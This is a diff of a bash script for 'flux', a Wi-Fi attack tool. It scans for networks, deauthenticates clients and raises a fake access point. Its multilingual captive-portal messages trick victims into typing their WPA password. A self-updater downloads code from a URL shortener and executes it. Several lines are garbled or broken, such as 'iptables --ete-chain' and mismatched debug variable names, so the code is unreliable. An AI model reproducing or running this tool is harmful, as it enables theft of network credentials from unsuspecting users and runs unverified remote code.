@@ -1,45 +1,32 @@
 #!/bin/bash
 
-########## Modus Debug #########
+########## Mode deBUG ##########
 ##			      ##
-       Flux_DEBUG=0
+        FLUX_DEBUG=0
 ##			      ##
 ################################
 
-################################
-# Name : Flux
-# Version : 0.03
-# ##############################
+#Um sofort in den Entwickler Modus zu gelangen einfach FLUX_DEBUG auf 1 setzen 
 
-###############################
-# Bug:
-# conditional_clear() fixed
-# negative channel fixed
-# html page fixed
 
-################################
-
-#fixed soon 
-#2
-
+##################################### < CONFIGURATION SCRIPT > #####################################
 clear
-##################################### < CONFIGURATION VOM SCRIPT > #####################################
-#DUMP_PATH 
+# Dump PATH
 DUMP_PATH="/tmp/TMPflux"
-#Anzahl der "DEAUTHTIME"
-DEAUTHTIME="8"
-#Anzahl der "revsion"
-revision=35
-# Numero de version
-version=0.03
+# Anzahl de desautentificaciones
+deAUTHTIME="8"
+# Anzahl der Wiederhohlungen
+Wiederhohlung=35
+# Version
+version=1.14
 # IP DHCP
 IP=192.168.1.1
+# Erstellen von Netzwerkvariblen 
 RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)
 
-#Farben 
-
+#Farben
 weis="\033[1;37m"
-grau="\033[0;37m"
+grau ="\033[0;37m"
 magenta="\033[0;35m"
 rot="\033[1;31m"
 gruen="\033[1;32m"
@@ -47,197 +34,247 @@ gelb="\033[1;33m"
 blau="\033[1;34m"
 transparent="\e[0m"
 
-# Debug / Entwickler MODUS
-if [ $flux_DEBUG = 1 ]; then
+
+# Normaler Modus oder Entwickler Modus 
+if [ $FLUX_deBUG = 1 ]; then
+	## Entwickler Modus
 	export flux_output_device=/dev/stdout
 	HOLD="-hold"
 else
+	## Normaler Modus
 	export flux_output_device=/dev/null
 	HOLD=""
 fi
 
-
+# Löscht Daten, falls FLUX_DEBUG=0 {Normaler Modus}
 function conditional_clear() {
 	
 	if [[ "$flux_output_device" != "/dev/stdout" ]]; then clear; fi
 }
 
-# Check Updates [Not WORKING]
-# Updates könnnen nicht abgeruen werden da die Seite nicht verfügbar ist
-# Für event. rückfragen deltaxflux@github.com 
+# Version wird überprüft
+# Und nach Updates gesucht 
+# Momentan funktioniert dies nicht
+function checkupdatess {
+	
+	Wiederhohlung_online="$(timeout -s SIGTERM 20 curl -L "https://sites.google.com/site/flux" 2>/dev/null| grep "^Wiederhohlung" | cut -d "=" -f2)"
+	if [ -z "$Wiederhohlung_online" ]; then
+		echo "?">$DUMP_PATH/Irev
+	else
+		echo "$Wiederhohlung_online">$DUMP_PATH/Irev
+	fi
+	
+}
 
-
-#	function checkupdatess {
-#	
-#	revision_online="$(timeout -s soTERM 20 curl -L "https://sites.google.com/site/	#flux" 	2>/dev/null| grep "^revision" | cut -d "=" -f2)"
-#	if [ -z "$revisoon_online" ]; then
-#		echo "?">$DUMP_PATH/Irev
-##	else
-#		echo "$revision_online">$DUMP_PATH/Irev
-#	fi
-#	
-#}
-
-
-
-#Animationen 
+# Animationen 
+# Siehe Start 
 function spinner {
 	
 	local pid=$1
-	local delay=0.15
+	local ay=0.15
 	local spinstr='|/-\'
 		while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
 			local temp=${spinstr#?}
 			printf " [%c]  " "$spinstr"
 			local spinstr=$temp${spinstr%"$temp"}
-			sleep $delay
+			sleep $ay
 			printf "\b\b\b\b\b\b"
 		done
 	printf "    \b\b\b\b"
 }
-# Debug Modus
-if [ "$flux_DEBUG" = "1" ]; then
-	trap 'err_report $flux' ERR
+
+# Bei Fehlern nur im DEBUG Modus angezeigt
+if [ "$FLUX_deBUG" = "1" ]; then
+	trap 'err_report $FLUXION' ERR
 fi
 
-# ERROR
+# Zeigt Fehler an 
 function err_report {
-	echo "Error 002 $1"
+	echo "Error en la linea $1"
 }
 
-
-# Script
+ 
 trap exitmode SIGINT
 
-#Wichtig nicht editieren 
-#Hindergrundprozesse löchen / Anwirken um event. 
-###########################################################################
-
+# Eventuelle Störungen werden hiermit verhindert
 function exitmode {
 	
-	echo -e "\n\n"$weis["$Rot" "$weis"] "$rot"ERROR 01"$Transparent"
+	echo -e "\n\n"$weis"["$rot" "$weis"] "$rot"Laufende Reinigung und Schließung."$transparent""
 	
 	if ps -A | grep -q aireplay-ng; then
-		echo -e ""$weis"["$Rot"-"$weis"] "$weis "Matando "$Grau "aireplay-ng"$Transparent
+		echo -e ""$weis"["$rot"-"$weis"] "$weis"Töte "$grau "aireplay-ng"$transparent""
 		killall aireplay-ng &>$flux_output_device
 	fi
 	
 	if ps -A | grep -q airodump-ng; then
-		echo -e ""$weis"["$rot"-"$weis"] "$weis"Matando "$grau"airodump-ng"$transparent""
+		echo -e ""$weis"["$rot"-"$weis"] "$weis"Töte "$grau "airodump-ng"$transparent""
 		killall airodump-ng &>$flux_output_device
 	fi
 	
 	if ps a | grep python| grep fakedns; then
-		echo -e ""$weis"["$rot"-"$weis"] "$weis"Matando "$grau"python"$transparent""
+		echo -e ""$weis"["$rot"-"$weis"] "$weis"Töte "$grau "python"$transparent""
 		kill $(ps a | grep python| grep fakedns | awk '{print $1}') &>$flux_output_device
 	fi
 	
 	if ps -A | grep -q hostapd; then
-		echo -e ""$weis"["$rot"-"$weis"] "$weis"Matando "$grau"hostapd"$transparent""
+		echo -e ""$weis"["$rot"-"$weis"] "$weis"Töte "$grau "hostapd"$transparent""
 		killall hostapd &>$flux_output_device
 	fi
 	 
 	if ps -A | grep -q lighttpd; then
-		echo -e ""$weis"["$rot"-"$weis"] "$weis"Matando "$grau"lighttpd"$transparent""
+		echo -e ""$weis"["$rot"-"$weis"] "$weis"Töte "$grau "lighttpd"$transparent""
 		killall lighttpd &>$flux_output_device
 	fi
 	 
 	if ps -A | grep -q dhcpd; then
-		echo -e ""$weis"["$rot"-"$weis"] "$weis"Matando "$grau"dhcpd"$transparent""
+		echo -e ""$weis"["$rot"-"$weis"] "$weis"Töte "$grau "dhcpd"$transparent""
 		killall dhcpd &>$flux_output_device
 	fi
 	
 	if ps -A | grep -q mdk3; then
-		echo -e ""$weis"["$rot"-"$weis"] "$weis"Matando "$grau"mdk3"$transparent""
+		echo -e ""$weis"["$rot"-"$weis"] "$weis"Töte "$grau "mdk3"$transparent""
 		killall mdk3 &>$flux_output_device
 	fi
 	
 	if [ "$WIFI_MONITOR" != "" ]; then
-		echo -e ""$weis"["$rot"-"$weis"] "$weis"Interface erkennen "$gruen"$WIFI_MONITOR"$transparent""
+		echo -e ""$weis"["$rot"-"$weis"] "$weis"V "$gruen"$WIFI_MONITOR"$transparent""
 		airmon-ng stop $WIFI_MONITOR &> $flux_output_device
 	fi
 	
 	if [ "$WIFI" != "" ]; then
-		echo -e ""$weis"["$rot"-"$weis"] "$weis"Interface erkennen "$gruen"$WIFI"$transparent""
+		echo -e ""$weis"["$rot"-"$weis"] "$weis"Stoppen von Schnittstellentraffic "$gruen"$WIFI"$transparent""
 		airmon-ng stop $WIFI &> $flux_output_device
 	fi
 	
 	if [ "$(cat /proc/sys/net/ipv4/ip_forward)" != "0" ]; then
-		echo -e ""$weis"["$rot"-"$weis"] "$weis"Restaurando "$grau"ipforwarding"$transparent""
+		echo -e ""$weis"["$rot"-"$weis"] "$weis"Wiederherstellung "$grau "ipforwarding"$transparent""
 		echo "0" > /proc/sys/net/ipv4/ip_forward #stop ipforwarding
 	fi
 	
-	echo -e ""$weis"["$rot"-"$weis"] "$weis"Limpiando "$grau"iptables"$transparent""
+	echo -e ""$weis"["$rot"-"$weis"] "$weis"Limpiando "$grau "iptables"$transparent""
 	iptables --flush
 	iptables --table nat --flush
-	iptables --delete-chain
-	iptables --table nat --delete-chain
+	iptables --ete-chain
+	iptables --table nat --ete-chain
 	
-	echo -e ""$weis"["$rot"-"$weis"] "$weis"Restaurando "$grau"tput"$transparent""
-	tput cNeinrm
+	echo -e ""$weis"["$rot"-"$weis"] "$weis"Wiederherstellung "$grau "tput"$transparent""
+	tput cnorm
 	
-	if [ $flux_DEBUG != 1 ]; then
+	if [ $FLUX_deBUG != 1 ]; then
 		
-		echo -e ""$weis"["$rot"-"$weis"] "$weis"Eliminando "$grau"archivos"$transparent""
+		echo -e ""$weis"["$rot"-"$weis"] "$weis"Beseitigen   "$grau "archivos"$transparent""
 		rm -R $DUMP_PATH/* &>$flux_output_device
 	fi
 	
-	echo -e ""$weis"["$rot"-"$weis"] "$weis"Reiniciando "$grau"Netzwerk Manager"$transparent""
+	echo -e ""$weis"["$rot"-"$weis"] "$weis"Neustart "$grau "NetworkManager"$transparent""
 	service restart networkmanager &> $flux_output_device &
 	
-	echo -e ""$weis"["$gruen"+"$weis"] "$gruen"Limpiza efectuada con exito!"$transparent""
+	echo -e ""$weis"["$gruen"+"$weis"] "$gruen"Reinigung erfolgreich durchgeführt!"$transparent""
 	exit
 	
 }
-# Web Interface 
-# Mehr Informationen Siehe HTML Seite 
-# Interface vom Script DE
-readarray -t webinterfaces < <(echo -e "Interface 
-\e[1;31mBeenden"$transparent""
+
+# Erzeugt eine Liste aller Schnittstellen 
+readarray -t webinterfaces < <(echo -e "Schnittstelle
+\e[1;31mSalir"$transparent""
 )
 
-
-
-
-# Web Interface
+# Erzeugt eine Liste aller Sprachen
 readarray -t webinterfaceslenguage < <(echo -e "Engish [ENG]
-\e[1;31mAtras"$transparent ""
+Spanish[ESP] GERMAN [GER]
+\e[1;31mAtras"$transparent""
 )
 
-#Interface in GUI in DE
-DIALOG_WEB_INFO_ENG="Da ein Sicherheitsproblem aufgetreten ist <b>"$Host_ENC"</b> Geben Sie bitte den WPA2 Schlüssel erneut ein um ihre Identität zu überprüfen"
-DIALOG_WEB_INPUT_ENG="Geben sie ihre WPA2 Password ein"
+#deutsch
+#DIALOG_WEB_INFO_GER="Um ihre Identität zu bestätigen geben sie bitte <b>"$Host_ENC"</b> #das WPA2 Passwort ein, um wieder den zugang zum Internet zu erhalten"
+#DIALOG_WEB_INPUT_GER="Geben sie das WPA2 Passwort ein"
+#DIALOG_WEB_SUBMIT_GER="Bestätigen"
+#DIALOG_WEB_ERROR_GER="<b><font color=\"red\" size=\"3\">Error</font>:</b> Das eingegebene #Passwort ist <b>nicht</b> korrekt!</b>"
+#DIALOG_WEB_OK_GER="Die Verbindung wird in wenigen sekunden wieder hergestellt"
+#DIALOG_WEB_BACK_GER="zurück"
+#DIALOG_WEB_LENGHT_MIN_GER="Das Passwort muss länger als 7 Zeichen haben"
+#DIALOG_WEB_LENGHT_MAX_GER="Das Passwort muss weniger als 64 Zeichen haben"
+
+#englisch
+DIALOG_WEB_INFO_ENG="For security reasons, enter the <b>"$Host_ENC"</b> key to access the Internet"
+DIALOG_WEB_INPUT_ENG="Enter your WPA password:"
 DIALOG_WEB_SUBMIT_ENG="Submit"
-DIALOG_WEB_ERROR_ENG="<b><font color=\"red\" size=\"3\">Error</font>:</b> Das eingegebene Passwort ist <b>falsch</b> korrekt !</b>"
-DIALOG_WEB_OK_ENG="Vielen Dank ihre Verbindung wird in wenigen Minuten wieder hergestellt"
-DIALOG_WEB_BACK_ENG="Zurück"
-DIALOG_WEB_LENGHT_MIN_ENG="Das Passwort müsst länger als 7 Zeichen sein"
-DIALOG_WEB_LENGHT_MAX_ENG="Das Passwort müsst kürzer als 64 Zeichen sein"
+DIALOG_WEB_ERROR_ENG="<b><font color=\"red\" size=\"3\">Error</font>:</b> The entered password is <b>NOT</b> correct!</b>"
+DIALOG_WEB_OK_ENG="Your connection will be restored in a few moments."
+DIALOG_WEB_BACK_ENG="Back"
+DIALOG_WEB_LENGHT_MIN_ENG="The password must be more than 7 characters"
+DIALOG_WEB_LENGHT_MAX_ENG="The password must be less than 64 characters"
 
-#GUI 
+#spannisch
+DIALOG_WEB_INFO_ESP="Por razones de seguridad, introduzca la contrase&ntilde;a <b>"$Host_ENC"</b> para acceder a Internet"
+DIALOG_WEB_INPUT_ESP="Introduzca su contrase&ntilde;a WPA:"
+DIALOG_WEB_SUBMIT_ESP="Enviar"
+DIALOG_WEB_ERROR_ESP="<b><font color=\"red\" size=\"3\">Error</font>:</b> La contrase&ntilde;a introducida <b>NO</b> es correcta!</b>"
+DIALOG_WEB_OK_ESP="Su conexi&oacute;n se restablecer&aacute; en breves momentos."
+DIALOG_WEB_BACK_ESP="Atr&aacute;s"
+DIALOG_WEB_LENGHT_MIN_ESP="La clave debe ser superior a 7 caracteres"
+DIALOG_WEB_LENGHT_MAX_ESP="La clave debe ser inferior a 64 caracteres"
 
+#italienisch
+DIALOG_WEB_INFO_IT="Per motivi di sicurezza, immettere la chiave <b>"$Host_ENC"</b> per accedere a Internet"
+DIALOG_WEB_INPUT_IT="Inserisci la tua password WPA:"
+DIALOG_WEB_SUBMIT_IT="Invia"
+DIALOG_WEB_ERROR_IT="<b><font color=\"red\" size=\"3\">Errore</font>:</b> La password <b>NON</b> &egrave; corretta!</b>"
+DIALOG_WEB_OK_IT="La connessione sar&agrave; ripristinata in pochi istanti."
+DIALOG_WEB_BACK_IT="Indietro"
+DIALOG_WEB_LENGHT_MIN_IT="La password deve essere superiore a 7 caratteri"
+DIALOG_WEB_LENGHT_MAX_IT="La password deve essere inferiore a 64 caratteri"
+
+#französisch
+DIALOG_WEB_INFO_FR="Pour des raisons de s&eacute;curit&eacute;, veuillez introduire <b>"$Host_ENC"</b> votre cl&eacute; pour acceder &agrave; Internet"
+DIALOG_WEB_INPUT_FR="Entrez votre cl&eacute; WPA:"
+DIALOG_WEB_SUBMIT_FR="Valider"
+DIALOG_WEB_ERROR_FR="<b><font color=\"red\" size=\"3\">Error</font>:</b> La cl&eacute; que vous avez introduit <b>NOT</b> est incorrecte!</b>"
+DIALOG_WEB_OK_FR="Veuillez patienter quelques instants."
+DIALOG_WEB_BACK_FR="Pr&eacute;c&eacute;dent"
+DIALOG_WEB_LENGHT_MIN_FR="La passe dois avoir plus de 7 digits"
+DIALOG_WEB_LENGHT_MAX_FR="La passe dois avoir moins de 64 digits"
+
+#portugiesisch
+DIALOG_WEB_INFO_POR="Por raz&#245;es de seguran&#231;a, digite a senha para acessar a Internet"
+DIALOG_WEB_INPUT_POR="Digite sua senha WPA"
+DIALOG_WEB_SUBMIT_POR="Enviar"
+DIALOG_WEB_ERROR_POR="<b><font Color=\"red\" size=\"3\">Erro</font>:</b> A senha digitada <b>N&#195;O</b> est&#225; correto </b>!"
+DIALOG_WEB_OK_POR="Sua conex&#227;o &#233; restaurada em breve."
+DIALOG_WEB_BACK_POR="Voltar"
+DIALOG_WEB_LENGHT_MIN_POR="A senha deve ter mais de 7 caracteres"
+DIALOG_WEB_LENGHT_MAX_POR="A chave deve ser menor que 64 caracteres"
+
+# Muestra el mensaje principal  script
 function mostrarheader(){
 	
-	clear
+	conditional_clear
 	echo -e "$gruen#########################################################"
 	echo -e "$gruen#                                                       #"
-	echo -e "$gruen#$rot		 flux $version" "${gelb}by ""${azul}Deltax""$gruen                    #"
-	echo -e "$gruen#""${rot}	F""${gelb}lux" "${rot}I""${gelb}s" ""${rot}"a" ""${rot}S""${gelb}ocial ""${rot}E""${gelb}nginering" "${rot}T""${gelb}ool""$gruen"     	 	#"
+	echo -e "$gruen#$rot		 FLUX $version" "${gelb}by ""${blau}DELTAX""$gruen                    #"
+	echo -e "$gruen#""${rot}	F""${gelb}lux" "${rot}I""${gelb}s" "${rot}N""${gelb}ot a ""${rot}S""${gelb}ocial ""${rot}E""${gelb}nginering" "${rot}T""${gelb}ool""$gruen            #"
 	echo -e "$gruen#                                                       #"
-	echo -e "$gruen#########################################################""$transparent "
-	echo
+	echo -e "$gruen#########################################################""$transparent"
+	echo "Keep CALM"
 	echo
 }
 
-#Admin Rechte überprüfen 
+##################################### < CONFIGURATION  SCRIPT > #####################################
+
+
+
+
+
+
+############################################## < Anfang > ##############################################
+
+
 if ! [ $(id -u) = "0" ] 2>/dev/null; then
-	echo -e "\e[1;31mSie haben keine Admin Rechte"$transparent""
-	echo "Bitte starten sie neu; sudo ./flux.sh" 
+	echo -e "\e[1;31mSie haben keine root Rechte"$transparent""
 	exit
 fi
 
-# Programme überprüfen mit HASH
-# FÜr mehr informationen siehe flux WIKI
+# Prüfen ob alle Programme installiert wurden
 
 function checkdependences {
 	
@@ -401,30 +438,93 @@ function checkdependences {
 	sleep 1
 	clear
 }
+
 mostrarheader
 checkdependences
 
+# Erstellen eines Ordners
 if [ ! -d $DUMP_PATH ]; then
 	mkdir $DUMP_PATH &>$flux_output_device
 fi
 
+# Script
+if [ $FLUX_deBUG != 1 ]; then
+	
+	echo "" 
+	sleep 0.1 && echo -e $rot                  
+	sleep 0.1 && echo -e $rot " .::::::::.::      .::     .::.::      .::"
+	sleep 0.1 && echo -e $rot " .::      .::      .::     .:: .::   .::  "
+	sleep 0.1 && echo -e $rot " .::      .::      .::     .::  .:: .::   "
+	sleep 0.1 && echo -e $rot " .::::::  .::      .::     .::    .::     "
+	sleep 0.1 && echo -e $rot " .::      .::      .::     .::  .:: .::   "
+	sleep 0.1 && echo -e $rot " .::      .::      .::     .:: .::   .::  "
+	sleep 0.1 && echo -e $rot " .::      .::::::::  .:::::   .::      .::"
+  
+	sleep 0.1 && echo ""
+	sleep 0.1 && echo ""
+	sleep 0.1 && echo -e $gelb "           _       ______  ___ "$weis"   __"$gelb" ___  "$gruen"    __  __           __"
+	sleep 0.1 && echo -e $gelb "          | |     / / __ \/   |"$weis"  / /"$gelb"|__ \ "$gruen"   / / / /___ ______/ /__"
+	sleep 0.1 && echo -e $gelb "          | | /| / / /_/ / /| |"$weis" / /"$gelb" __/ /"$gruen"   / /_/ / __  / ___/ //_/"
+	sleep 0.1 && echo -e $gelb "          | |/ |/ / ____/ ___ |"$weis"/ /"$gelb" / __/ "$gruen"  / __  / /_/ / /__/ ,<"
+	sleep 0.1 && echo -e $gelb "          |__/|__/_/   /_/  |_"$weis"/_/"$gelb" /____/ "$gruen" /_/ /_/\__,_/\___/_/|_|" 
+	sleep 0.1 && echo ""
+	sleep 0.1 && echo ""
+	sleep 1
+	echo -e $rot"                     FLUX "$weis""$version" (rev. "$gruen"$Wiederhohlung"$weis") "$gelb"by "$weis" flux"
+	sleep 1
+	echo -e $gruen"                        Para "$rot"flux.jimdo.com "$transparent
+	sleep 1
+	echo -n "                              Latest rev."
+	tput civis
+	checkupdatess &
+	spinner "$!"
+	Wiederhohlung_online=$(cat $DUMP_PATH/Irev)
+	echo -e ""$weis" [${magenta}${Wiederhohlung_online}$weis"$transparent"]"
+		if [ "$Wiederhohlung_online" != "?" ]; then
+			
+			if [ "$Wiederhohlung" != "$Wiederhohlung_online" ]; then
+				
+				cp $0 $HOME/flux_rev-$Wiederhohlung.backup
+				curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:11.0) Gecko/20100101 Firefox/11.0" -L http://goo.gl/Y5JX7c -s -o $0
+				echo
+				echo
+				echo -e ""$rot"Neue Version gefunden! Script startet neu"$transparent""
+				sleep 5
+				chmod +x $0
+				exec $0
+				
+			fi
+		fi
+	echo ""
+	tput cnorm
+	sleep 2
+	
+fi
 
+# Info AP
 function infoap {
 	
 	Host_MAC_info1=`echo $Host_MAC | awk 'BEGIN { FS = ":" } ; { print $1":"$2":"$3}' | tr [:upper:] [:lower:]`
-	Host_MAC_MODEL=`macchanger -l | grep $Host_MAC_info1 | awk '{ print $5,$6,$7 }'`
-	echo "Info das WLAN"
+	Host_MAC_MO=`macchanger -l | grep $Host_MAC_info1 | awk '{ print $5,$6,$7 }'`
+	echo "INFO AP OBJETIVO"
 	echo
-	echo -e "                     "$gruen"SSSID"$transparent" = $Host_SSID / $Host_ENC"
-	echo -e "                    "$gruen"Channel"$transparent" = $channel"
-	echo -e "                "$gruen"Beacon"$transparent" = ${speed:2} Mbps"
-	echo -e "               "$gruen"MAC "$transparent" = $mac (\e[1;33m$Host_MAC_MODEL"$transparent")"
+	echo -e "                     "$gruen"SSID"$transparent" = $Host_SSID / $Host_ENC"
+	echo -e "                    "$gruen"Canal"$transparent" = $channel"
+	echo -e "                "$gruen"Velocidad"$transparent" = ${speed:2} Mbps"
+	echo -e "               "$gruen"MAC  AP"$transparent" = $mac (\e[1;33m$Host_MAC_MO"$transparent")"
 	echo
 }
 
+############################################## < BEGINN > ##############################################
 
-####################### GUI - Menü #########################################
-#Automatische erkennung der Auflösung 
+
+
+
+
+
+############################################### < MENU > ###############################################
+
+# Die optimale Auflösung sollte automatisch erkannt werden
 function setresolution {
 
 	function resA {
@@ -454,6 +554,7 @@ function setresolution {
 		TOPRIGHTBIG="-geometry 109x30-0+0"
 	}
 	function resD {
+
 		TOPLEFT="-geometry 110x35+0+0"
 		TOPRIGHT="-geometry 99x40-0+0"
 		BOTTOMLEFT="-geometry 110x35+0-0"
@@ -476,7 +577,7 @@ function setresolution {
 		BOTTOMRIGHT="-geometry 90x20-0-0" 
 		TOPLEFTBIG="-geometry  100x70+0+0" 
 		TOPRIGHTBIG="-geometry 90x27-0+0"  
-	}
+}
 
 detectedresolution=$(xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3)
 ##  A) 1024x600
@@ -492,16 +593,14 @@ case $detectedresolution in
 	"1280x1024" ) resD ;;
 	"1600x1200" ) resE ;;
 	"1366x768"  ) resF ;;
-		  * ) resA ;; ## Fall
+		  * ) resA ;; 
 esac
 }
 
-
-#Interface [Automatische Erkennung der Auflösung] 
-#Siehe Abschnitt 1
+# Wähle Schnittstelle
 function setinterface {
 	
-	
+	# Stopt Monitor Mode
 	KILLMONITOR=`iwconfig 2>&1 | grep Monitor | awk '{print $1}'`
 	
 	for monkill in ${KILLMONITOR[@]}; do
@@ -509,40 +608,41 @@ function setinterface {
 		echo -n "$monkill, "
 	done
 	
-	readarray -t wirelessiterfaces < <(airmon-ng |grep "-" | awk '{print $1}')
-
+	# Erstelle Liste von allen physikalischen Netzwerkschnittstellen
+	readarray -t wirelessifaces < <(airmon-ng |grep "-" | awk '{print $1}')
 	INTERFACESNUMBER=`airmon-ng| grep -c "-"`
 	
 	echo
 	echo
-	echo Automatische erkennung der Auflösung 
+	echo Automatische Erkennung der Auflösung [AEA]
 	echo $detectedresolution
 	echo
-
-	#Netzwerk Interface
+	
+	
+	# Bei nur einer Netzwerk Karte
 	if [ "$INTERFACESNUMBER" -gt "0" ]; then
-
-		echo "Wählen sie ihre Wlan Interface"
+		
+		echo "Wähle deine Netzwerkschnittstelle"
 		echo
 		i=0
 		
-		for line in "${wirelesinterfaces[@]}"; do
+		for line in "${wirelessifaces[@]}"; do
 			i=$(($i+1))
-			wirelessinterfaces[$i]=$line
+			wirelessifaces[$i]=$line
 			echo -e "$gruen""$i)"$transparent" $line"
 		done
 		
 		echo -n "#? "
 		read line
-		PREWIFI=${wirelessinterfacefaces[$line]}
+		PREWIFI=${wirelessifaces[$line]}
 		
 		if [ $(echo "$PREWIFI" | wc -m) -le 3 ]; then
-			clear
+			conditional_clear
 			mostrarheader
 			setinterface
 		fi
 		
-		readarray -t softwaremolesto < <(airmon-ng check $PREWIFI | tail -n +8 | grep -v "Interface" | awk '{ print $2 }')
+		readarray -t softwaremolesto < <(airmon-ng check $PREWIFI | tail -n +8 | grep -v "on interface" | awk '{ print $2 }')
 		WIFIDRIVER=$(airmon-ng | grep "$PREWIFI" | awk '{print($(NF-2))}')
 		rmmod -f "$WIFIDRIVER" &>$flux_output_device 2>&1
 		
@@ -554,58 +654,52 @@ function setinterface {
 		modprobe "$WIFIDRIVER" &>$flux_output_device 2>&1
 		sleep 0.5
 
-		# Wählen sie ihr interface
+		# Schnittstelle muss gewählt werden
 		select PREWIFI in $INTERFACES; do
 			break;
 		done
-
-
-		WIFIMONITOR=$(airmon-ng start $PREWIFI | grep "Wifi Monitor [wlan0mon]" | cut -d " " -f 5 | cut -d ")" -f 1)
-		WIFI_MONITOR=$WIFIMONITOR
-	
-		  WIFI=$PREWIFI
 		
-
+		WIFIMONITOR=$(airmon-ng start $PREWIFI | grep "enabled on" | cut -d " " -f 5 | cut -d ")" -f 1)
+		WIFI_MONITOR=$WIFIMONITOR
+		# Variable wird einer Physikalische Schnittstelle zugeordnet
+		  WIFI=$PREWIFI
+		# Falls keine Physikalische Schnittstelle erkannt wird, beendet es sich automatisch
 	else
-		# Interface konnte nicht gefunden / erkannt werden ; quit	
-		echo Kein Wlan Interface erkannt ; ...
+		
+		echo Keine Physikalische Netzwerkschnittstelle gefunden, Beende...
 		sleep 5
 		exitmode
 	fi
 	
+	deltax
+	
+}
+
+# Überprüfe Datei
 function deltax {
 	
-	clear
+	conditional_clear
 	CSVDB=dump-01.csv
 	
 	rm -rf $DUMP_PATH/*
 	
 	choosescan
 	selection
-	changer
 }
 
-function changer {
-	clear
-	macchanger -a wlan0
-	macchanger -a wlan0mon
-	macchanger -a wlan1
-	macchanger -a wlan1mon
-
-}
-	
+# Sie können einen oder mehrer Kanäle scannen
 function choosescan {
 	
-	clear
+	conditional_clear
 	
 	while true; do
-		clear
+		conditional_clear
 		mostrarheader
 		
-		echo "Wählen sie ihren Channel "
+		echo "Wählen sie ihren Kanal"
 		echo "                                       "
-		echo -e "      "$gruen"1)"$transparent" Alle Channel             "
-		echo -e "      "$gruen"2)"$transparent" Ausgewählte Channel      "
+		echo -e "      "$gruen"1)"$transparent" Einen Kanal           "
+		echo -e "      "$gruen"2)"$transparent" Mehrer Kanäle       "
 		echo "                                       "
 		echo -n "      #> "
 		read yn
@@ -613,44 +707,43 @@ function choosescan {
 		case $yn in
 			1 ) Scan ; break ;;
 			2 ) Scanchan ; break ;;  
-			* ) echo "Opción descoNeincida. Elige de nuevo"; clear ;;
+			* ) echo "Unbekannte Operation, bitte wählen sie noch mal"; conditional_clear ;;
 		  esac
 	done
 }
 
 function Scanchan {
 	  
-	clear
+	conditional_clear
 	mostrarheader
 	
 	  echo "                                       "
-	  echo "      Wählen sie einen Channel     "
+	  echo "      Selecciona Canal de busqueda     "
 	  echo "                                       "
-	  echo -e "     Ein Channel     "$gruen"6"$transparent"               "
-	  echo -e "     Mehrere Channel   "$gruen"1-5"$transparent"             "
-	  echo -e "     Mehrere Channel  "$gruen"1,2,5-7,11"$transparent"      "
+	  echo -e "      1 Kanal     "$gruen"6"$transparent"               "
+	  echo -e "      Kanalbereich  "$gruen"1-5"$transparent"             "
+	  echo -e "      Mehrere Kanalbereiche "$gruen"1,2,5-7,11"$transparent"      "
 	  echo "                                       "
 	echo -n "      #> "
 	read channel_number
 	set -- ${channel_number}
-	clear
+	conditional_clear
 	
 	rm -rf $DUMP_PATH/dump*
-	xterm $HOLD -title "Channel auswahl -->  $channel_number" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng -w $DUMP_PATH/dump --channel "$channel_number" -a $WIFI_MONITOR
+	xterm $HOLD -title "Escaneando Objetivos en el canal -->  $channel_number" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng -w $DUMP_PATH/dump --channel "$channel_number" -a $WIFI_MONITOR
 }
 
+# Durchsucht das ganze Netzwerk
 function Scan {
 	
-	clear
-	xterm $HOLD -title "Wlan Netzwerke" $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e airodump-ng -w $DUMP_PATH/dump -a $WIFI_MONITOR
+	conditional_clear
+	xterm $HOLD -title "Escaneando Objetivos ..." $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e airodump-ng -w $DUMP_PATH/dump -a $WIFI_MONITOR
 }
 
-
-
-
+# Wählen sie ein Netzwerk
 function selection {
 	
-	clear
+	conditional_clear
 	mostrarheader
 	
 	
@@ -664,9 +757,9 @@ function selection {
 	linap=`expr $linap - 1`
 	head -n $linap $DUMP_PATH/$CSVDB &> $DUMP_PATH/dump-02.csv 
 	tail -n +$linap $DUMP_PATH/$CSVDB &> $DUMP_PATH/clientes.csv 
-	echo "                         Wlan Liste "
+	echo "                         Zielpfad der APS "
 	echo ""
-	echo " #      MAC                      CHAN    SECU     PWR    ESJaD"
+	echo " #      MAC                      CHAN    SECU     PWR    ESSID"
 	echo ""
 	i=0
 	
@@ -685,7 +778,7 @@ function selection {
 			
 			echo -e " ""$gruen"$i")"$weis"$CLIENTE\t""$gelb"$MAC"\t""$gruen"$CHANNEL"\t""$rot" $PRIVACY"\t  ""$gelb"$POWER%"\t""$gruen"$ESSID""$transparent""
 			aidlenght=$IDLENGTH
-			asid[$i]=$ESSID
+			assid[$i]=$ESSID
 			achannel[$i]=$CHANNEL
 			amac[$i]=$MAC
 			aprivacy[$i]=$PRIVACY
@@ -693,13 +786,13 @@ function selection {
 		fi
 	done < $DUMP_PATH/dump-02.csv
 	echo
-	echo -e ""$gruen"("$weis"*"$gruen") Red con Clientes"$transparent""
+	echo -e ""$gruen"("$weis"*"$gruen") Netzwerk"$transparent""
 	echo ""
-	echo "        Netzwerk auswahl              "
+	echo "        Netzwerk auswählen             "
 	echo -n "      #> "
 	read choice
 	idlenght=${aidlenght[$choice]}
-	ssid=${asid[$choice]}
+	ssid=${assid[$choice]}
 	channel=$(echo ${achannel[$choice]}|tr -d [:space:])
 	mac=${amac[$choice]}
 	privacy=${aprivacy[$choice]}
@@ -709,15 +802,16 @@ function selection {
 	Host_ENC=$privacy
 	Host_MAC=$mac
 	Host_CHAN=$channel
-	acouper=${#sJad}
+	acouper=${#ssid}
 	fin=$(($acouper-idlength))
-	Host_SJaD=${sJad:1:fin}
+	Host_SSID=${ssid:1:fin}
 	
-	clear
+	conditional_clear
 	
 	askAP
 }
 
+# Fake AP Modus
 function askAP {
 		
 	DIGITOS_WIFIS_CSV=`echo "$Host_MAC" | wc -m`
@@ -736,11 +830,11 @@ function askAP {
 		
 		infoap
 		
-		echo "Modus Fake AP"
+		echo "Modus FakeAP"
 		echo "                                       "
